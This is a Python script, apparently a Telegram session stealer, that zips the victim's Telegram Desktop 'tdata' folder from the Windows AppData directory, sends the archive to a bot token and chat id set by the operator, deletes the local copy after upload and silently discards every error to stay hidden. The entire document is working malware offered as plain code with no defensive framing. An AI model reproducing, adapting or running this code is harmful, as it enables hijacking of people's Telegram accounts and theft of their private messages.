import os
import zipfile
import io
import asyncio
from datetime import datetime
from telegram import Bot, TelegramError

async def create_zip_from_directory(directory: str) -> io.BytesIO:
    if not os.path.exists(directory):
        raise FileNotFoundError(f"Directory '{directory}' does not exist.")

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, start=os.path.dirname(directory))
                try:
                    zip_file.write(file_path, arcname)
                except PermissionError:
                    continue

    zip_buffer.seek(0)
    return zip_buffer

async def save_zip_to_file(zip_buffer: io.BytesIO, filename: str) -> None:
    with open(filename, 'wb') as f:
        f.write(zip_buffer.getvalue())

async def send_zip_to_telegram(zip_buffer: io.BytesIO, filename: str, bot_token: str, chat_id: str) -> bool:
    bot = Bot(token=bot_token)
    zip_buffer.seek(0)

    for attempt in range(3):
        try:
            await bot.send_document(chat_id=chat_id, document=zip_buffer, filename=filename)
            return True
        except TelegramError:
            await asyncio.sleep(2)
    return False

async def main() -> None:
    account_name: str = os.getlogin()
    timestamp: str = datetime.now().strftime("%Y%m%d_%H%M%S")
    telegram_path: str = os.path.join('C:\\Users', account_name, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    zip_filename: str = f'LOG-{account_name}-{timestamp}.zip'
    local_zip_path: str = os.path.join(os.getcwd(), zip_filename)
    
    bot_token: str = 'tg bot token'
    chat_id: str = 'tg chat id'

    try:
        zip_buffer: io.BytesIO = await create_zip_from_directory(telegram_path)
        await save_zip_to_file(zip_buffer, local_zip_path)
        sent_successfully: bool = await send_zip_to_telegram(zip_buffer, zip_filename, bot_token, chat_id)

        if sent_successfully and os.path.exists(local_zip_path):
            os.remove(local_zip_path)
    except Exception:
        pass

if __name__ == "__main__":
    asyncio.run(main())
